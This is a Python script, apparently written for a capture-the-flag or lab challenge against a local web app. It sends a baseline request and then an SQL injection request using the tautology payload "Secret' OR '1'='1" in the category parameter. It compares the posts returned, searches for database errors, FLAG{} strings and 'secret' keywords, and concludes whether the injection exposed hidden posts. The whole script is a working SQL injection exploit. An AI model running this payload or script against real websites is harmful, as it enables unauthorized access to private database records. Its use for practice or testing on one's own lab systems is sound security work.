import requests
from bs4 import BeautifulSoup
import re

base_url = "http://127.0.0.1:33130"

# Send baseline request
baseline_url = f"{base_url}/?category=Secret"
print(f"[+] Sending baseline request to: {baseline_url}")
baseline_resp = requests.get(baseline_url, timeout=10)
print(f"[+] Baseline status: {baseline_resp.status_code} | Content length: {len(baseline_resp.content)}B")

# Send SQL injection request
injection_url = f"{base_url}/?category=Secret' OR '1'='1"
print(f"\n[+] Sending SQL injection request to: {injection_url}")
injection_resp = requests.get(injection_url, timeout=10)
print(f"[+] Injection status: {injection_resp.status_code} | Content length: {len(injection_resp.content)}B")

# Parse both responses
baseline_soup = BeautifulSoup(baseline_resp.text, 'html.parser')
injection_soup = BeautifulSoup(injection_resp.text, 'html.parser')

def extract_posts(soup, label):
    """Extract all posts from the parsed HTML"""
    posts = []
    
    # Find all post elements - common patterns
    post_containers = soup.find_all(['div', 'article', 'section'], class_=lambda x: x and 'post' in x.lower()) or \
                     soup.find_all('div', {'class': 'post'}) or \
                     soup.find_all('div', {'class': 'blog-post'}) or \
                     soup.select('div.post, article.post, section.post')
    
    if not post_containers:
        # Try finding by structure - h2/h3 followed by p
        headings = soup.find_all(['h1', 'h2', 'h3', 'h4'])
        for heading in headings:
            content = heading.find_next(['p', 'div'])
            if content:
                posts.append({
                    'title': heading.get_text(strip=True),
                    'content': content.get_text(strip=True)
                })
    else:
        for container in post_containers:
            # Extract title
            title_elem = container.find(['h1', 'h2', 'h3', 'h4', 'h5']) or \
                        container.find(['div', 'span'], class_=lambda x: x and 'title' in x.lower())
            
            # Extract content
            content_elem = container.find(['p', 'div'], class_=lambda x: x and 'content' in x.lower()) or \
                          container.find('p')
            
            title = title_elem.get_text(strip=True) if title_elem else "No title"
            content = content_elem.get_text(strip=True) if content_elem else "No content"
            
            posts.append({
                'title': title,
                'content': content
            })
    
    print(f"\n{'='*80}")
    print(f"{label} POSTS ({len(posts)} total):")
    print(f"{'='*80}")
    
    for i, post in enumerate(posts, 1):
        print(f"\n[{i}] Title: {post['title']}")
        print(f"    Content: {post['content'][:200]}{'...' if len(post['content']) > 200 else ''}")
    
    return posts

# Extract posts from both responses
baseline_posts = extract_posts(baseline_soup, "BASELINE")
injection_posts = extract_posts(injection_soup, "SQL INJECTION")

# Compare post counts
print(f"\n{'='*80}")
print("COMPARISON SUMMARY:")
print(f"{'='*80}")
print(f"Baseline posts: {len(baseline_posts)}")
print(f"Injection posts: {len(injection_posts)}")
print(f"Difference: {len(injection_posts) - len(baseline_posts)} additional posts")

# Find posts that appear in injection but not baseline
baseline_titles = {post['title'] for post in baseline_posts}
new_posts = [post for post in injection_posts if post['title'] not in baseline_titles]

if new_posts:
    print(f"\n[!!!] NEW POSTS REVEALED BY SQL INJECTION ({len(new_posts)}):")
    for i, post in enumerate(new_posts, 1):
        print(f"\n[{i}] Title: {post['title']}")
        print(f"     Content: {post['content']}")
else:
    print("\n[-] No new posts revealed (posts are identical or just different order)")

# Look for PHP error messages in both responses
def find_php_errors(text, label):
    php_error_patterns = [
        r'Warning:.*?\.php.*',
        r'Fatal error:.*?\.php.*',
        r'Parse error:.*?\.php.*',
        r'Notice:.*?\.php.*',
        r'SQL syntax.*',
        r'mysql_.*?error',
        r'PDOException.*',
        r'You have an error in your SQL syntax.*',
        r'Unknown column.*',
        r'Table .* doesn\'t exist.*'
    ]
    
    errors = []
    for pattern in php_error_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE | re.MULTILINE)
        errors.extend(matches)
    
    if errors:
        print(f"\n[+] PHP/MySQL Errors in {label}:")
        for error in errors:
            print(f"    - {error.strip()}")
    else:
        print(f"\n[-] No PHP/MySQL errors found in {label}")
    
    return errors

print(f"\n{'='*80}")
print("ERROR MESSAGE ANALYSIS:")
print(f"{'='*80}")
baseline_errors = find_php_errors(baseline_resp.text, "BASELINE")
injection_errors = find_php_errors(injection_resp.text, "SQL INJECTION")

# Look for flags in both responses
def find_flags(text, label):
    flag_pattern = r'FLAG\{[^}]+\}'
    flags = re.findall(flag_pattern, text)
    
    if flags:
        print(f"\n[!!!] FLAGS FOUND in {label}:")
        for flag in flags:
            print(f"    - {flag}")
    else:
        print(f"\n[-] No FLAG{{}} patterns found in {label}")
    
    return flags

print(f"\n{'='*80}")
print("FLAG SEARCH:")
print(f"{'='*80}")
baseline_flags = find_flags(baseline_resp.text, "BASELINE")
injection_flags = find_flags(injection_resp.text, "SQL INJECTION")

# Look for secret indicators
def find_secrets(text, label):
    secret_patterns = [
        r'secret.*',  # "secret" keyword
        r'hidden.*',  # "hidden" keyword
        r'confidential.*',  # "confidential" keyword
        r'private.*',  # "private" keyword
    ]
    
    secrets = []
    for pattern in secret_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        secrets.extend(matches)
    
    if secrets:
        print(f"\n[+] Secret indicators in {label} ({len(secrets)} found)")
        # Show first 3 to avoid spam
        for i, secret in enumerate(secrets[:3], 1):
            print(f"    {i}. {secret.strip()[:100]}")
        if len(secrets) > 3:
            print(f"    ... and {len(secrets) - 3} more")
    else:
        print(f"\n[-] No obvious secret indicators in {label}")
    
    return secrets

print(f"\n{'='*80}")
print("SECRET INDICATOR ANALYSIS:")
print(f"{'='*80}")
baseline_secrets = find_secrets(baseline_resp.text, "BASELINE")
injection_secrets = find_secrets(injection_resp.text, "SQL INJECTION")

# Final comparison summary
print(f"\n{'='*80}")
print("FINAL ANALYSIS:")
print(f"{'='*80}")
print(f"Response size difference: {len(injection_resp.content) - len(baseline_resp.content)} bytes")
print(f"New posts revealed: {len(new_posts)}")
print(f"Flags in baseline: {len(baseline_flags)}")
print(f"Flags in injection: {len(injection_flags)}")
print(f"Errors in baseline: {len(baseline_errors)}")
print(f"Errors in injection: {len(injection_errors)}")

if len(injection_posts) > len(baseline_posts):
    print("\n[+] CONCLUSION: SQL INJECTION IS WORKING - additional posts revealed!")
elif new_posts:
    print("\n[+] CONCLUSION: SQL INJECTION IS WORKING - different posts revealed!")
else:
    print("\n[-] CONCLUSION: SQL injection may not be working, or posts are the same.")
    
# Print raw response snippets for manual inspection if needed
print(f"\n{'='*80}")
print("RAW RESPONSE SNIPPETS (first 500 chars):")
print(f"{'='*80}")
print("\nBaseline response snippet:")
print(baseline_resp.text[:500])
print("\nInjection response snippet:")
print(injection_resp.text[:500])

# Check if responses are identical
if baseline_resp.text == injection_resp.text:
    print("\n[!] WARNING: Both responses are IDENTICAL - SQL injection had no effect")
else:
    print("\n[+] Responses are DIFFERENT - SQL injection may have altered the results")
